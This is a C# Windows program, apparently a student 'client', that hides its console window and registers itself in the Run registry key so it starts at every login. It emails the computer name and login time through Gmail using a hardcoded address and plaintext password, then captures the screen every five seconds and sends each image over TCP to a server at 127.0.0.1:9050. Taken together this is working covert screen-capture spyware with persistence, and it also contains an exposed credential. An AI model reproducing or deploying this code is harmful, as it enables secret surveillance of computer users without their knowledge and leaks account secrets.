using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Xml;
using System.Net.Mail;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Studient_Client
{
    internal class Program
    {
        private static Bitmap screenBitmap;
        private static Graphics screenGraphics;
        private static Timer timer;
        static byte[] data = new byte[1024];

        //Running under background
        #region Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;
        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        #endregion

        //Turn on with OS 
        #region Registry that open with window
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\Running Service");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Running Under background", keyvalue);
                regstart.SetValue("Running Service", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
            }
        }
        #endregion
        static void Main(string[] args)
        {
            StartWithOS();
            HideWindow();
            try
            {
                //Get computer name
                string computerName = Environment.MachineName;

               //Get time now
                DateTime currentDateTime = DateTime.Now;
                string timeNow = $"{currentDateTime:yyyy-MM-dd_HHmmss}";

                // Define the SMTP client for Gmail
                SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587, // Use port 587 for TLS
                    Credentials = new NetworkCredential("vy4451050467@st.qnu.edu.vn", "@Ndv25102003."), // Your Gmail email and password
                    EnableSsl = true, // Enable SSL/TLS encryption
                };

                // Construct the email message
                MailMessage mailMessage = new MailMessage
                {
                    From = new MailAddress("vy4451050467@st.qnu.edu.vn"),
                    Subject = "Login alerts",
                    Body = $" Notifications about the login of : \nComputer Name: {computerName}. \nLast Login Time: {timeNow}.",
                    IsBodyHtml = false, // Set to true if the body contains HTML
                };

                // Add recipient(s)
                mailMessage.To.Add("vy4451050467@st.qnu.edu.vn");

                // Send the email
                smtpClient.Send(mailMessage);

                Console.WriteLine("Email sent successfully!");
            }
            catch (SmtpException smtpEx)
            {
                Console.WriteLine("SMTP Exception: " + smtpEx.Message);
                if (smtpEx.InnerException != null)
                {
                    Console.WriteLine("Inner Exception: " + smtpEx.InnerException.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred while sending the email: " + ex.Message);
            }
        



        timer = new Timer();
            timer.Interval = 5000;
            timer.Tick += Timer_Tick;
            timer.Start();

            // Chờ timer để chụp ảnh màn hình tiếp theo
            Application.Run();
        }

        // Hàm xử lý sự kiện Timer_Tick
        private static void Timer_Tick(object sender, EventArgs e)
        {
            try
            {
                // Gọi hàm chụp màn hình và lưu ảnh
                string fileName = GetFilename();
                CaptureScreenAndSave(fileName);

                // Gửi ảnh
                SendFile("127.0.0.1", 9050, fileName);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in Timer_Tick: " + ex.Message);
            }
        }



        static string GetFilename()
        {   string nameCpt = Environment.MachineName;
            DateTime currentDateTime = DateTime.Now;
            string fileName = $"{nameCpt}--{currentDateTime:yyyy-MM-dd_HHmmss}.png";
            string directoryName = @"C:\DinhVy-ThanhDong\ImageClient";
            Directory.CreateDirectory(directoryName);
            string fullPath = Path.Combine(directoryName, fileName);
            return fullPath;
        }

        static void CaptureScreenAndSave(string filePath)
        {
            try
            {
                screenBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                screenGraphics = Graphics.FromImage(screenBitmap);
                screenGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                screenBitmap.Save(filePath, ImageFormat.Png);
                Console.WriteLine("Screenshot saved to: " + filePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Issue: " + ex.Message);
            }
        }

      
        static void SendFile(string serverIP, int port, string filePath)
        {
            try
            {
                // Kết nối đến máy chủ
              
                TcpClient client = new TcpClient(serverIP, port);
                NetworkStream networkStream = client.GetStream();
              

                // Đọc dữ liệu từ file
                byte[] fileData = File.ReadAllBytes(filePath);

                // Lấy tên tập tin từ đường dẫn file
                string fileName = Path.GetFileName(filePath);

                // Gửi tên tập tin đến máy chủ
                byte[] fileNameBytes = Encoding.UTF8.GetBytes(fileName);
                byte[] fileNameSize = BitConverter.GetBytes(fileNameBytes.Length);
                networkStream.Write(fileNameSize, 0, fileNameSize.Length);
                networkStream.Write(fileNameBytes, 0, fileNameBytes.Length);

                // Gửi kích thước của file đến máy chủ
                byte[] fileSize = BitConverter.GetBytes(fileData.Length);
                networkStream.Write(fileSize, 0, fileSize.Length);

                // Gửi dữ liệu file đến máy chủ
                networkStream.Write(fileData, 0, fileData.Length);

                Console.WriteLine("Image sent successfully.");

                // Đóng kết nối
                networkStream.Close();
                client.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Issue: " + ex.Message);
            }
        }
    }

}